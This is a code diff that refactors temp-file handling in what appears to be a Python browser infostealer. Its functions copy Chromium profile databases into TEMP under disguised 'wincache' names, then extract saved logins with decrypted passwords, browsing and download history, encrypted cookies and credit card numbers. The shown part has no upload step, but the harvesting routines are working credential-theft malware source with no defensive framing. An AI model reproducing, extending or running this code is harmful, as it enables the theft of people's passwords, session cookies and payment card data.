@@ -140,9 +140,9 @@ def get_login_data(path, master_key, blink = False):
             num = path.rfind("\\")
             profile = path[num+1:]
             logins += f"===============================\n\n\n{profile}:\n\n"
-        login_db = f'{path}\\Login Data'
-        copy2(login_db, join(environ["TEMP"], "lwincache.db"))
-        conn = connect(join(environ["TEMP"], "lwincache.db"))
+        login_db = join(environ["TEMP"], "lwincache.db")
+        copy2(join(path, "Login Data"), login_db)
+        conn = connect(login_db)
         cursor = conn.cursor()
 
         cursor.execute("SELECT action_url, username_value, password_value FROM logins")
@@ -152,7 +152,7 @@ def get_login_data(path, master_key, blink = False):
 
             alldatapass = Types.Login(row[0], row[1], decrypted_password)
             logins += str(alldatapass) + "\n"
-        remove(join(environ["TEMP"], "lwincache.db"))
+        remove(login_db)
     except Exception as e: Log(f"{path} logins ---> {e}")
 
 def get_web_history(path, blink = False):
@@ -164,9 +164,9 @@ def get_web_history(path, blink = False):
             history += f"===============================\n\n\n{profile}:\n\n"
         HistorySQL = "SELECT url FROM visits"
         HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
-        history_db = join(path, 'history')
-        copy2(history_db, join(environ["TEMP"], "hwincache.db"))
-        c = connect(join(environ["TEMP"], "hwincache.db"))
+        history_db = join(environ["TEMP"], "hwincache.db")
+        copy2(join(path, "History"), history_db)
+        c = connect(history_db)
         cursor = c.cursor()
 
         for result in cursor.execute(HistorySQL).fetchall():
@@ -178,7 +178,7 @@ def get_web_history(path, blink = False):
             history += result + "\n\n"
         
         c.close()
-        remove(join(environ["TEMP"], "hwincache.db"))
+        remove(history_db)
     except Exception as e:
         Log(f"{path} history ---> {e}")
 
@@ -189,11 +189,9 @@ def get_downloads(path, blink = False):
             num = path.rfind("\\")
             profile = path[num+1:]
             downhistory += f"===============================\n\n\n{profile}:\n\n"
-        downloads_db = f'{path}\\History'
-        if not exists(downloads_db):
-            return
-        copy2(downloads_db, join(environ["TEMP"], "dwincache.db"))
-        conn = connect(join(environ["TEMP"], "dwincache.db"))
+        downloads_db = join(environ["TEMP"], "dwincache.db")
+        copy2(join(path, "History"), downloads_db)
+        conn = connect(downloads_db)
         cursor = conn.cursor()
         cursor.execute('SELECT tab_url, target_path FROM downloads')
         for row in cursor.fetchall():
@@ -201,7 +199,7 @@ def get_downloads(path, blink = False):
             downhistory += str(Types.DownHistory(row[0], row[1])) + "\n\n"
 
         conn.close()
-        remove(join(environ["TEMP"], "dwincache.db"))
+        remove(downloads_db)
     except Exception as e:
         Log(f"{path} downhistory ---> {e}")
 
@@ -213,11 +211,10 @@ def get_cookies(path, master_key, blink = False):
             num = path.rfind("\\")
             profile = path[num+1:]
             cookies += f"===============================\n\n\n{profile}:\n\n"
-        cookie_db = path + '\\Network\\Cookies'
-        if not exists(cookie_db):
-            return None
-        copy_locked(cookie_db, join(environ["TEMP"], "cwincache.db"))
-        conn = connect(join(environ["TEMP"], "cwincache.db"))
+        if not exists(join(path, "Network\\Cookies")): return None
+        cookie_db = join(environ["TEMP"], "cwincache.db")
+        copy_locked(join(path, "Network\\Cookies"), cookie_db)
+        conn = connect(cookie_db)
         cursor = conn.cursor()
         cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies ORDER BY host_key ASC")
         for row in cursor.fetchall():
@@ -231,7 +228,7 @@ def get_cookies(path, master_key, blink = False):
         cookies_list.clear()
         
         conn.close()
-        remove(join(environ["TEMP"], "cwincache.db"))
+        remove(cookie_db)
     except Exception as e:
         Log(f"{path} cookies ---> {e}")
 
@@ -265,11 +262,11 @@ def get_credit_cards(path, master_key, blink = False):
             num = path.rfind("\\")
             profile = path[num+1:]
             cards += f"===============================\n\n\n{profile}:\n\n"
-        cards_db = f'{path}\\Web Data'
-        if not exists(cards_db): return
+        cards_db = join(environ["TEMP"], "crwincache.db")
+        if not exists(join(path, "Web Data")): return None
 
-        copy2(cards_db, join(environ["TEMP"], "crwincache.db"))
-        conn = connect(join(environ["TEMP"], "crwincache.db"))
+        copy2(join(path, "Web Data"), cards_db)
+        conn = connect(cards_db)
         cursor = conn.cursor()
         cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
         for row in cursor.fetchall():
@@ -280,7 +277,7 @@ def get_credit_cards(path, master_key, blink = False):
             cards += str(Types.CreditCard(row[0], card_number, row[1], row[2], row[4])) + "\n\n"
 
         conn.close()
-        remove(join(environ["TEMP"], "crwincache.db"))
+        remove(cards_db)
     except Exception as e:
         Log(f"{path} cards ---> {e}")
 
